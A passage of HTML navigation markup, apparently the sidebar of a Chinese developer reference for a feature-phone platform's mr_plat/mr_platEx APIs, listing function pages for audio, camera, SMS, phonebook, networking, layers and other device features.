fa-file-text-o" aria-hidden="true"></i> mr_plat(6) - 读取模拟器游戏积分</a></li><li><a href="mr_plat(7).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_plat(7) - 按键音开启关闭控制</a></li><li><a href="mr_plat(8).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_plat(8) - 设置wap下载的.nes保存所使用的存储器</a></li><li><a href="mr_platEx(11).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_platEx(11) - 获取手机平台的mp3存储目录名称</a></li><li><a href="mr_platEx(12).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_platEx(12) - 获取手机平台的picture存储目录名称</a></li></ul></details></li><li><details><summary><i class="fa fa-book" aria-hidden="true"></i> 本地UI扩展接口</summary><ul><li><a href="mr_platEx(1).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_platEx(1) - 创建一个单/多选菜单</a></li><li><a href="mr_platEx(2).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_platEx(2) - 设置菜单项</a></li><li><a href="mr_platEx(3).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_platEx(3)</a></li><li><a href="mr_platEx(4).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_platEx(4)</a></li><li><a href="mr_platEx(5).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_platEx(5)</a></li><li><a href="mr_plat(104).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_plat(104) - 销毁窗口而不画屏幕</a></li><li><a href="mr_platEx(5101).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_platEx(5101) - 修改本地UI的左右软键文本</a></li></ul></details></li><li><details><summary><i class="fa fa-book" aria-hidden="true"></i> 文件系统扩展接口</summary><ul><li><a href="mr_plat(1218).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_plat(1218) - 查询存储卡的状态</a></li><li><a href="mr_plat(1231).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_plat(1231) - 获得当前文件的指针的位置</a></li><li><a href="mr_platEx(1204).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_platEx(1204) - 切换目录</a></li><li><a href="mr_platEx(1305).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_platEx(1305) - 获得指定盘符的剩余空间</a></li><li><a href="mr_platEx(1306).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_platEx(1306) - 获取存储设备的名称</a></li></ul></details></li><li><details><summary><i class="fa fa-book" aria-hidden="true"></i> 网络扩展接口</summary><ul><li><a href="mr_plat(1001).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_plat(1001) - 查询socket的连接状态</a></li><li><a href="mr_plat(1002).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_plat(1002) - 设置socket的连接等待时间</a></li><li><a href="mr_platEx(1003).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_platEx(1003) - 绑定一个socket到本机端口</a></li><li><a href="mr_platEx(1226).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_platEx(1226) - 获取PLMN</a></li><li><a href="mr_plat(1327).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_plat(1327) - 查询WIFI是否可用</a></li><li><a href="mr_plat(1328).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_plat(1328) - 设置是否使用WIFI联网</a></li><li><a href="mr_platEx(6004).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_platEx(6004) - 查询最后一次联网时间</a></li></ul></details></li><li><details><summary><i class="fa fa-book" aria-hidden="true"></i> 后台程序接口</summary><ul><li><a href="mr_plat(1003).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_plat(1003) - 激活后台程序到前台</a></li><li><a href="mr_platEx(1004).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_platEx(1004) - 切换到后台运行</a></li><li><a href="mr_platEx(1005).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_platEx(1005) - 在状态栏上显示图标</a></li><li><a href="mr_plat(1006).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_plat(1006) - 隐藏状态栏上的图标</a></li><li><a href="mr_plat(1326).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_plat(1326) - 控制状态栏显示</a></li><li><a href="mr_plat(1391).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_plat(1391) - 查询是否支持后台接口</a></li><li><a href="mr_platEx(6000).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_platEx(6000) - 查询桌面气泡框是否支持</a></li><li><a href="mr_platEx(6001).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_platEx(6001) - 显示桌面气泡框</a></li><li><a href="mr_platEx(6002).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_platEx(6002) - 隐藏桌面气泡框</a></li><li><a href="mr_platEx(6003).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_platEx(6003) - 是否在待机界面</a></li><li><a href="mr_platEx(1323).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_platEx(1323) - 设置异步转后台</a></li><li><a href="mr_platEx(6005).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_platEx(6005) - 停止异步转后台</a></li></ul></details></li><li><details><summary><i class="fa fa-book" aria-hidden="true"></i> 音频接口</summary><ul><li><a href="mr_platEx(201x).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_platEx(201x) - 设备初始化</a></li><li><a href="mr_platEx(202x).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_platEx(202x) - 加载一个文件</a></li><li><a href="mr_plat(1302).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_plat(1302) - 设置声音的大小</a></li><li><a href="mr_platEx(203x).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_platEx(203x) - 加载缓冲数据</a></li><li><a href="mr_platEx(204x).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_platEx(204x) - 从当前的位置开始播放</a></li><li><a href="mr_platEx(205x).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_platEx(205x) - 暂停播放</a></li><li><a href="mr_platEx(206x).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_platEx(206x) - 继续播放</a></li><li><a href="mr_platEx(207x).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_platEx(207x) - 停止播放</a></li><li><a href="mr_platEx(208x).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_platEx(208x) - 关闭设备</a></li><li><a href="mr_platEx(209x).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_platEx(209x) - 获取当前设备的状态</a></li><li><a href="mr_platEx(210x).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_platEx(210x) - 设置播放位置，已经播放了多少时间</a></li><li><a href="mr_platEx(211x).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_platEx(211x) - 设置播放位置，已经播放了相对文件或者缓冲的起始位置的偏移量</a></li><li><a href="mr_platEx(212x).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_platEx(212x) - 获取整首歌的播放时间</a></li><li><a href="mr_platEx(213x).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_platEx(213x) - 获取当前的播放进度时间</a></li><li><a href="mr_platEx(215x).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_platEx(215x) - 获取当前的播放进度时间</a></li><li><a href="mr_platEx(216x).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_platEx(216x) - 多媒体模块释放</a></li><li><a href="mr_platEx(220x).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_platEx(220x) - 占用IRAM</a></li><li><a href="mr_platEx(221x).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_platEx(221x) - 释放IRAM</a></li><li><a href="mr_platEx(222x).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_platEx(222x) - 多通道加载</a></li><li><a href="mr_platEx(223x).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_platEx(223x) - 多通道播放已经加载的数据</a></li><li><a href="mr_platEx(224x).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_platEx(224x) - 多通道播放停止</a></li><li><a href="mr_platEx(225x).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_platEx(225x) - 多通道释放已经加载的数据</a></li><li><a href="mr_plat(102).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_plat(102) - 告知驱动PCM写入数据的绝对地址</a></li><li><a href="mr_plat(103).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_plat(103) - 取得PCM数据已经播放掉的数据的绝对地址</a></li></ul></details></li><li><details><summary><i class="fa fa-book" aria-hidden="true"></i> CAMERA 接口</summary><ul><li><a href="mr_plat(2500).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_plat(2500) - 初始化</a></li><li><a href="mr_platEx(2501).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_platEx(2501) - 进入预览状态</a></li><li><a href="mr_plat(2502).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_plat(2502) - 暂停</a></li><li><a href="mr_plat(2503).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_plat(2503) - 恢复</a></li><li><a href="mr_plat(2504).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_plat(2504) - 关闭</a></li><li><a href="mr_platEx(2505).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_platEx(2505) - 拍照</a></li><li><a href="mr_plat(2506).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_plat(2506) - 获得缩放等级</a></li><li><a href="mr_plat(2507).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_plat(2507) - 放大</a></li><li><a href="mr_plat(2508).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_plat(2508) - 缩小</a></li><li><a href="mr_platEx(2509).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_platEx(2509) - 获取预览数据</a></li></ul></details></li><li><details><summary><i class="fa fa-book" aria-hidden="true"></i> 录音接口</summary><ul><li><a href="mr_platEx(2700).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_platEx(2700) - 开始录音</a></li><li><a href="mr_plat(2701).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_plat(2701) - 暂停</a></li><li><a href="mr_plat(2702).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_plat(2702) - 恢复</a></li><li><a href="mr_plat(2703).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_plat(2703) - 停止</a></li><li><a href="mr_platEx(2704).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_platEx(2704) - 获得PCM数据</a></li></ul></details></li><li><details><summary><i class="fa fa-book" aria-hidden="true"></i> 图片接口</summary><ul><li><a href="mr_platEx(3001).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_platEx(3001) - 获取图片信息</a></li><li><a href="mr_platEx(3002).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_platEx(3002) - 图片解码</a></li><li><a href="mr_platEx(3003).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_platEx(3003) - 查询解码状态</a></li><li><a href="mr_platEx(3004).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_platEx(3004) - gif解码</a></li><li><a href="mr_platEx(3005).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_platEx(3005) - 释放gif解码资源</a></li><li><a href="mr_platEx(3007).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_platEx(3007) - 绘制BUFFER</a></li><li><a href="mr_platEx(3008).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_platEx(3008) - 获取ACTIVE LAYER</a></li><li><a href="mr_platEx(3009).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_platEx(3009) - DMA异步刷屏</a></li><li><a href="mr_platEx(3010).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_platEx(3010) - 直接调用平台接口将图片绘制到指定的矩形内</a></li><li><a href="mr_platEx(3011).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_platEx(3011) - 显示gif动画</a></li><li><a href="mr_plat(3012).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_plat(3012) - 停止动画</a></li><li><a href="mr_platEx(3013).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_platEx(3013)</a></li><li><a href="mr_platEx(3014).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_platEx(3014) - 绘制mtk资源格式的图片</a></li><li><a href="mr_platEx(3015).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_platEx(3015) - 绘制mtk资源格式的gif动画</a></li></ul></details></li><li><details><summary><i class="fa fa-book" aria-hidden="true"></i> 电话本接口</summary><a style="PADDING-LEFT: 20px" href="电话本接口.htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> 电话本接口</a><ul><li><a href="mr_platEx(4011).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_platEx(4011) - 电话本搜索</a></li><li><a href="mr_platEx(4012).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_platEx(4012) - 电话本编辑</a></li><li><a href="mr_platEx(4016).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_platEx(4016) - 获取条目信息</a></li><li><a href="mr_plat(4017).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_plat(4017) - 拷贝记录</a></li><li><a href="mr_platEx(4021).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_platEx(4021) - 设置本机号码</a></li><li><a href="mr_plat(4022).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_plat(4022) - 获取本机号码</a></li><li><a href="mr_plat(4031).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_plat(4031) - 删除所有记录</a></li><li><a href="mr_platEx(4032).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_platEx(4032) - 获取电话本条数</a></li><li><a href="mr_platEx(4033).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_platEx(4033) - 获取电话本操作状态</a></li><li><a href="mr_platEx(4041).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_platEx(4041) - 创建平台电话本浏览对象</a></li><li><a href="mr_platEx(4042).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_platEx(4042) - 获得选中记录信息</a></li><li><a href="mr_platEx(4043).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_platEx(4043) - 销毁电话本浏览对象</a></li></ul></details></li><li><details><summary><i class="fa fa-book" aria-hidden="true"></i> * 短信模块接口</summary><ul><li><a href="mr_platEx(1008).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_platEx(1008) - 调用mtk的发送短信界面</a></li><li><a href="mr_plat(1011).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_plat(1011) - 设置收到新短信的时候是否显示提示界面</a></li><li><a href="mr_plat(1100).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_plat(1100) - 获得短信操作的状态</a></li><li><a href="mr_plat(1101).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_plat(1101) - 获得短信信箱中短息的条数</a></li><li><a href="mr_platEx(1102).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_platEx(1102) - 获得指定一条短信的信息</a></li><li><a href="mr_platEx(1103).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_platEx(1103) - 读取一条短信</a></li><li><a href="mr_platEx(1104).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_platEx(1104) - 删除一条短信</a></li><li><a href="mr_plat(1105).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_plat(1105) - 发送获得手机和sim卡存储空间</a></li><li><a href="mr_plat(1106).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_plat(1106) - 获得短信中心</a></li><li><a href="mr_platEx(1203).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_platEx(1203) - 发送彩信</a></li><li><a href="mr_platEx(4101).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> * mr_platEx(4101) - 设置要自动删除短信的条件</a></li></ul></details></li><li><details><summary><i class="fa fa-book" aria-hidden="true"></i> 数据账号接口</summary><a style="PADDING-LEFT: 20px" href="数据账号接口.htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> 数据账号接口</a><ul><li><a href="mr_plat(1107).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_plat(1107) - 发送获得apn信息的请求</a></li><li><a href="mr_platEx(1108).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_platEx(1108) - 从缓存中读取apn信息</a></li><li><a href="mr_platEx(1109).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_platEx(1109) - 设置apn信息</a></li><li><a href="mr_plat(1110).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_plat(1110) - 设置apn使用的标志位</a></li><li><a href="mr_plat(1111).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_plat(1111) - 调用mtk的界面设置apn</a></li></ul></details></li><li><details><summary><i class="fa fa-book" aria-hidden="true"></i> 手机信息查询及设置接口</summary><ul><li><a href="mr_plat(1205).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_plat(1205) - 获取手机是否是触摸屏信息</a></li><li><a href="mr_plat(1214).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_plat(1214) - 设置挂机键是否回IDLE</a></li><li><a href="mr_platEx(1009).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_platEx(1009) - 设置墙纸</a></li><li><a href="mr_platEx(1116).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_platEx(1116) - 获取编译时间</a></li><li><a href="mr_platEx(1117).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_platEx(1117) - 获取硬件版本号</a></li><li><a href="mr_platEx(1221).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_platEx(1221) - 获取APPLIST标题</a></li><li><details><summary><i class="fa fa-book" aria-hidden="true"></i> LCD旋转</summary><ul><li><a href="mr_plat(101).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_plat(101) - 设置旋转角度</a></li><li><a href="mr_plat(105).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_plat(105) - 获取旋转角度</a></li></ul></details></li><li><details><summary><i class="fa fa-book" aria-hidden="true"></i> 主题</summary><ul><li><a href="mr_platEx(1112).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_platEx(1112) - 激活手机主题</a></li><li><a href="mr_plat(1113).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_plat(1113) - 还原手机主题</a></li><li><a href="mr_plat(1114).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_plat(1114) - 获得当前激活的主题的appid</a></li><li><a href="mr_plat(1115).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_plat(1115) - 设置主题中主菜单当前选中的宫格的index</a></li></ul></details></li><li><details><summary><i class="fa fa-book" aria-hidden="true"></i> 铃音</summary><ul><li><a href="mr_platEx(1208).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_platEx(1208) - 设置手机铃声</a></li></ul></details></li><li><details><summary><i class="fa fa-book" aria-hidden="true"></i> 语言</summary><ul><li><a href="mr_plat(1206).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_plat(1206) - 获取手机当前设置的语言</a></li><li><a href="mr_platEx(0x90002).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_platEx(0x90002)</a></li></ul></details></li><li><details><summary><i class="fa fa-book" aria-hidden="true"></i> 情景模式</summary><ul><li><a href="mr_plat(1213).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_plat(1213) - 获得手机当前的情景模式</a></li></ul></details></li><li><details><summary><i class="fa fa-book" aria-hidden="true"></i> 字体</summary><ul><li><a href="mr_platEx(1201).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_platEx(1201) - 获取字宽字高</a></li></ul></details></li><li><details><summary><i class="fa fa-book" aria-hidden="true"></i> SIM卡信息</summary><ul><li><a href="mr_plat(1004).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_plat(1004) - 设置使用SIM卡</a></li><li><a href="mr_platEx(1307).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_platEx(1307) - 获取SIM卡个数信息</a></li></ul></details></li><li><details><summary><i class="fa fa-book" aria-hidden="true"></i> 时间日期</summary><ul><li><a href="mr_platEx(5001).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_platEx(5001) - 获取手机时间</a></li><li><a href="mr_platEx(5002).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_platEx(5002) - 设置手机时间</a></li><li><a href="mr_platEx(5011).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_platEx(5011) - 设置手机闹钟</a></li><li><a href="mr_platEx(5013).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_platEx(5013) - 获得手机闹钟个数</a></li><li><a href="mr_platEx(5014).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_platEx(5014) - 设置闹钟</a></li><li><a href="mr_platEx(0x90001).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_platEx(0x90001) - 获取当前时区信息</a></li></ul></details></li></ul></details></li><li><details><summary><i class="fa fa-book" aria-hidden="true"></i> NES模拟器接口</summary><ul><li><a href="mr_platEx(1210).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_platEx(1210) - 获取NES模拟器按键布局</a></li><li><a href="mr_platEx(1220).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_platEx(1220) - 获得rom目录</a></li><li><a href="mr_platEx(1225).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_platEx(1225) - 获取手柄信息</a></li></ul></details></li><li><details><summary><i class="fa fa-book" aria-hidden="true"></i> * 获取菜单树接口</summary><ul><li><a href="mr_platEx(106).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> * mr_platEx(106) - 获得手机菜单树</a></li><li><a href="mr_platEx(1324).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> * mr_platEx(1324) - 获得主菜单信息</a></li></ul></details></li><li><details><summary><i class="fa fa-book" aria-hidden="true"></i> 文件浏览接口</summary><ul><li><a href="mr_platEx(1401).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_platEx(1401) - 初始化筛选器</a></li><li><a href="mr_platEx(1402).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_platEx(1402) - 设置要显示的文件类型</a></li><li><a href="mr_platEx(1403).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_platEx(1403) - 设置不要显示的文件类型</a></li><li><a href="mr_platEx(1404).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_platEx(1404) - 调用平台本地浏览界面</a></li><li><a href="mr_platEx(1405).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_platEx(1405) - 获得选中的文件路径</a></li><li><a href="mr_platEx(1406).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_platEx(1406) - 销毁浏览器对象</a></li></ul></details></li><li><details><summary><i class="fa fa-book" aria-hidden="true"></i> 动感芯片接口</summary><a style="PADDING-LEFT: 20px" href="动感芯片接口.htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> 动感芯片接口</a><ul><li><a href="mr_plat(4001).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_plat(4001) - 停止动感芯片监听</a></li><li><a href="mr_plat(4002).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_plat(4002) - 给动感芯片上电</a></li><li><a href="mr_plat(4003).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_plat(4003) - 给动感芯片断电</a></li><li><a href="mr_plat(4004).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_plat(4004) - 动感芯片监听晃动模式</a></li><li><a href="mr_plat(4005).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_plat(4005) - 动感芯片监听倾斜模式</a></li><li><a href="mr_plat(4006).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_plat(4006) - 获取动感芯片上送的数值的范围值</a></li></ul></details></li><li><details><summary><i class="fa fa-book" aria-hidden="true"></i> 层接口</summary><ul><li><a href="mr_platEx(1308).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_platEx(1308) - 设置参与刷新的层</a></li><li><a href="mr_platEx(1309).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_platEx(1309) - 创建层</a></li><li><a href="mr_plat(1310).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_plat(1310) - 释放层</a></li><li><a href="mr_platEx(1311).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_platEx(1311) - 获得base层的句柄</a></li><li><a href="mr_plat(1312).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_plat(1312) - 设置激活层</a></li><li><a href="mr_platEx(1313).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_platEx(1313) - 设置层位置</a></li><li><a href="mr_plat(1314).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_plat(1314) - 设置png的背景层</a></li><li><a href="mr_platEx(1315).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_platEx(1315) - 获取激活层信息</a></li><li><a href="mr_platEx(1316).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_platEx(1316) - 层叠加</a></li><li><a href="mr_plat(1317).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_plat(1317) - 设置层的透明值</a></li><li><a href="mr_plat(1318).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_plat(1318) - 关闭层的透明属性</a></li><li><a href="mr_plat(1319).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_plat(1319) - 设置层的透明色</a></li><li><a href="mr_plat(1320).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_plat(1320) - 关闭层的透明色处理</a></li><li><a href="mr_plat(1321).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_plat(1321) - 设置刷屏锁</a></li><li><a href="mr_plat(1322).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_plat(1322) - 取消刷屏锁</a></li></ul></details></li><li><details><summary><i class="fa fa-book" aria-hidden="true"></i> 信号强度接口</summary><ul><li><a href="mr_plat(1016).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_plat(1016) -初始化</a></li><li><a href="mr_platEx(1017).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_platEx(1017) - 获得信号强度</a></li><li><a href="mr_plat(1018).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_plat(1018) - 关闭</a></li></ul></details></li><li><details><summary><i class="fa fa-book" aria-hidden="true"></i> 背光接口</summary><ul><li><a href="mr_plat(1020).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_plat(1020) - 获得当前背光状态</a></li><li><a href="mr_platEx(1222).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_platEx(1222) - 设置背光一直为开</a></li><li><a href="mr_platEx(1223).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_platEx(1223) - 恢复背光设置</a></li></ul></details></li><li><details><summary><i class="fa fa-book" aria-hidden="true"></i> 位置信息接口</summary><ul><li><a href="mr_plat(1215).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_plat(1215) - 初始化</a></li><li><a href="mr_plat(1216).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_plat(1216) - 关闭</a></li><li><a href="mr_platEx(1224).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_platEx(1224) - 获取小区ID</a></li></ul></details></li><li><details><summary><i class="fa fa-book" aria-hidden="true"></i> 内存扩展接口</summary><ul><li><a href="mr_platEx(1001).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_platEx(1001) - 获取屏幕缓冲</a></li><li><a href="mr_platEx(1002).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_platEx(1002) - 释放屏幕缓冲</a></li><li><a href="mr_platEx(1012).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_platEx(1012) - 申请内部RAM</a></li><li><a href="mr_platEx(1013).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_platEx(1013) - 释放内部RAM</a></li><li><a href="mr_platEx(1014).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_platEx(1014) - 申请扩展内存</a></li><li><a href="mr_platEx(1015).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_platEx(1015) - 释放扩展内存</a></li></ul></details></li><li><details><summary><i class="fa fa-book" aria-hidden="true"></i> QQ相关接口</summary><ul><li><a href="mr_platEx(1006).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_platEx(1006) - 启动平台QQ</a></li><li><a href="mr_platEx(1332).htm"><i class="fa fa-file-text-o" aria-hidden="true"></i> mr_platEx(1332) -SKYQQ接口</a></li></ul></details></li><li><details><summary><i class="fa fa-book" aria-hidden="true"></i> 天气预报相关接口</summary><ul><li><a 